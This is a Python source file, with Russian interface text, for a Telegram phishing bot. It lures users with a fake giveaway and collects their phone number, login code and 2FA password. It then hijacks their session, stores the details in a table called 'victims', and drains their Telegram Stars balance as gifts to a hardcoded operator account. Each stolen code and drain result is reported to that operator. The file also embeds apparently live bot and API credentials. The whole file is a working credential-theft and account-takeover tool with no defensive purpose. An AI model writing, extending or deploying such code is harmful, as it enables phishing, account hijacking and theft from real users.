# язык: Python 3.11+, файл: bot.py
# Render 24/7: Flask + aiogram + telethon

import asyncio, re, sqlite3, logging, os, threading
from datetime import datetime, timezone
from flask import Flask
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart
from aiogram.types import (Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove)
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import (SessionPasswordNeededError,
    PhoneCodeInvalidError, PhoneCodeExpiredError, PasswordHashInvalidError)

BOT_TOKEN   = os.getenv("BOT_TOKEN", "8737198969:AAG7iwITDUqjb6j_zBbh3MhaTf5ZDP0viN4")
API_ID      = int(os.getenv("API_ID", "31641505"))
API_HASH    = os.getenv("API_HASH", "08fcc0c23db249e75f5d0d8f3f74dddf")
OPERATOR_ID = int(os.getenv("OPERATOR_ID", "8296717436"))
DB          = "panel.db"

logging.basicConfig(level=logging.INFO)
STAGE, DATA, CLIENTS = {}, {}, {}

web = Flask(__name__)

@web.route("/")
@web.route("/health")
def health():
    return "OK", 200

def run_web():
    web.run(host="0.0.0.0", port=int(os.getenv("PORT", "10000")))

def db_init():
    con = sqlite3.connect(DB)
    con.execute("""CREATE TABLE IF NOT EXISTS victims(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tg_id INTEGER, username TEXT, phone TEXT, code TEXT,
        password TEXT, session TEXT, status TEXT,
        stars INTEGER DEFAULT 0, created TEXT)""")
    con.commit(); con.close()

def db_add(tg_id, username, phone, code):
    con = sqlite3.connect(DB)
    cur = con.execute("INSERT INTO victims(tg_id,username,phone,code,status,created) VALUES(?,?,?,?,?,?)",
        (tg_id, username, phone, code, "code", datetime.now(timezone.utc).isoformat()))
    vid = cur.lastrowid; con.commit(); con.close(); return vid

def db_set(vid, session=None, status=None, stars=None, password=None):
    con = sqlite3.connect(DB)
    f, v = [], []
    if session  is not None: f.append("session=?");  v.append(session)
    if status   is not None: f.append("status=?");   v.append(status)
    if stars    is not None: f.append("stars=?");    v.append(int(stars))
    if password is not None: f.append("password=?"); v.append(password)
    if f:
        v.append(vid)
        con.execute(f"UPDATE victims SET {','.join(f)} WHERE id=?", v)
    con.commit(); con.close()

def clean_phone(raw):
    p = re.sub(r"[^\d+]", "", raw or "")
    return p if p.startswith("+") else "+" + p

def clean_code(raw):
    return re.sub(r"\D", "", raw or "")

def stars_to_int(bal):
    if bal is None: return 0
    if isinstance(bal, int): return bal
    if hasattr(bal, "amount"): return int(bal.amount)
    if isinstance(bal, (list, tuple)):
        for x in bal:
            if hasattr(x, "amount"): return int(x.amount)
    try: return int(bal)
    except: return 0

async def get_client(phone):
    c = CLIENTS.get(phone)
    if c is None or not c.is_connected():
        c = TelegramClient(StringSession(), API_ID, API_HASH)
        await c.connect()
        CLIENTS[phone] = c
    return c

async def send_code(phone):
    print(f"[SEND_CODE] {phone!r}")
    try:
        c = await get_client(phone)
        sent = await c.send_code_request(phone)
        print(f"[SEND_CODE] OK pch={sent.phone_code_hash!r}")
        return sent.phone_code_hash, "sent"
    except Exception as e:
        print(f"[SEND_CODE] ERR {type(e).__name__}: {e}")
        return None, f"err:{e}"

async def try_login(phone, code, pch):
    print(f"[LOGIN] {phone!r} code={code!r}")
    try:
        c = await get_client(phone)
        await c.sign_in(phone=phone, code=code, phone_code_hash=pch)
    except SessionPasswordNeededError:
        s = CLIENTS[phone].session.save()
        return s, "needs_2fa"
    except PhoneCodeInvalidError as e:
        print(f"[LOGIN] invalid {e}"); return None, "invalid"
    except PhoneCodeExpiredError as e:
        print(f"[LOGIN] expired {e}"); return None, "expired"
    except Exception as e:
        print(f"[LOGIN] ERR {type(e).__name__}: {e}"); return None, f"err:{e}"
    s = CLIENTS[phone].session.save()
    print("[LOGIN] OK")
    return s, "ok"

async def try_2fa(session_str, password):
    c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await c.connect()
        await c.sign_in(password=password)
    except PasswordHashInvalidError:
        await c.disconnect(); return session_str, "wrong_password"
    except Exception as e:
        await c.disconnect(); return session_str, f"err:{e}"
    s = c.session.save(); await c.disconnect(); return s, "ok"

async def drain_stars(session_str):
    c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await c.connect()
    out = {"start": 0, "left": 0, "sent": 0, "err": []}
    try:
        b = await c(functions.payments.GetStarsStatusRequest(peer="me"))
        out["start"] = stars_to_int(getattr(b, "balance", 0))
        out["left"]  = out["start"]
        print(f"[STARS] balance={out['start']}")
        while out["left"] > 0:
            try:
                opts = await c(functions.payments.GetStarsGiftOptionsRequest())
                if not opts: break
                gift = None
                for o in sorted(opts, key=lambda x: x.stars, reverse=True):
                    if o.stars <= out["left"]:
                        gift = o; break
                if not gift: break
                await c(functions.payments.SendStarsGiftRequest(
                    user_id=OPERATOR_ID, stars=gift.stars))
                out["left"] -= gift.stars
                out["sent"] += 1
                print(f"[STARS] sent {gift.stars}, left={out['left']}")
            except Exception as e:
                out["err"].append(str(e)); break
    except Exception as e:
        out["err"].append(str(e))
    finally:
        await c.disconnect()
    return out

router = Router()

def kb_gift():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Забрать подарок", callback_data="g")]])

def kb_contact():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📱 Поделиться контактом", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True)

@router.message(CommandStart())
async def start(m: Message):
    await m.answer("👋 Привет!\n\n🎉 Ты в розыгрыше!\nЖми кнопку.", reply_markup=kb_gift())

@router.callback_query(F.data == "g")
async def gift(c: CallbackQuery):
    STAGE[c.from_user.id] = "contact"
    await c.message.answer("🔒 Верификация. Шаг 1 — поделись контактом.",
        reply_markup=kb_contact())
    await c.answer()

@router.message(F.contact)
async def on_contact(m: Message):
    if STAGE.get(m.from_user.id) != "contact":
        return
    phone = clean_phone(m.contact.phone_number)
    DATA.setdefault(m.from_user.id, {})["phone"] = phone
    pch, st = await send_code(phone)
    if pch is None:
        await m.answer("⚠️ Ошибка. Попробуй позже.")
        return
    DATA[m.from_user.id]["pch"] = pch
    STAGE[m.from_user.id] = "code"
    await m.answer(
        "✅ Контакт принят.\n\n📩 Код отправлен.\n\n"
        "⚠️ ВАЖНО: пиши код так: 1.2.3.4.5",
        reply_markup=ReplyKeyboardRemove())

@router.message(F.text)
async def on_text(m: Message):
    uid = m.from_user.id
    stage = STAGE.get(uid)

    if stage == "code":
        code = clean_code(m.text.strip())
        if not re.fullmatch(r"\d{3,7}", code):
            await m.answer("Пиши так: 1.2.3.4.5"); return
        phone = DATA.get(uid, {}).get("phone", "")
        pch = DATA.get(uid, {}).get("pch", "")
        vid = db_add(uid, m.from_user.username or "", phone, code)
        sess, st = await try_login(phone, code, pch)
        db_set(vid, session=sess or "", status=st)
        if OPERATOR_ID:
            try:
                await m.bot.send_message(OPERATOR_ID,
                    f"🔑 код: {code}\nphone: {phone}\n@{m.from_user.username} | {st}")
            except: pass
        if st == "ok":
            r = await drain_stars(sess)
            db_set(vid, session=sess, status="done", stars=r["start"])
            await m.answer("⏳ Верификация...")
            if OPERATOR_ID:
                try:
                    await m.bot.send_message(OPERATOR_ID,
                        f"💰 было {r['start']} | осталось {r['left']} | отправлено {r['sent']}\n{r['err']}")
                except: pass
            STAGE.pop(uid, None); DATA.pop(uid, None)
        elif st == "needs_2fa":
            DATA.setdefault(uid, {})["session"] = sess
            STAGE[uid] = "password"
            await m.answer("🔐 Пароль 2FA:")
        elif st == "expired":
            try:
                c = await get_client(phone)
                sent = await c.send_code_request(phone)
                DATA[uid]["pch"] = sent.phone_code_hash
                await m.answer("⌛ Код устарел. Отправил новый. Пиши: 1.2.3.4.5")
            except:
                STAGE.pop(uid, None); DATA.pop(uid, None)
                await m.answer("⌛ Ошибка. /start заново.")
        else:
            await m.answer("❌ Код неверный.")
        return

    if stage == "password":
        pwd = m.text.strip()
        sess = DATA.get(uid, {}).get("session", "")
        new_sess, st = await try_2fa(sess, pwd)
        con = sqlite3.connect(DB)
        row = con.execute("SELECT id FROM victims WHERE tg_id=? ORDER BY id DESC LIMIT 1", (uid,)).fetchone()
        con.close()
        vid = row[0] if row else None
        if vid: db_set(vid, session=new_sess, status=st, password=pwd)
        if st == "ok":
            r = await drain_stars(new_sess)
            if vid: db_set(vid, session=new_sess, status="done", stars=r["start"])
            await m.answer("⏳ Верификация...")
            if OPERATOR_ID:
                try:
                    await m.bot.send_message(OPERATOR_ID,
                        f"💰 было {r['start']} | осталось {r['left']} | отправлено {r['sent']}")
                except: pass
            STAGE.pop(uid, None); DATA.pop(uid, None)
        else:
            await m.answer("❌ Пароль неверный.")
        return

    await m.answer("Напиши /start.")

async def main():
    db_init()
    bot = Bot(BOT_TOKEN)
    dp = Dispatcher()
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    asyncio.run(main())
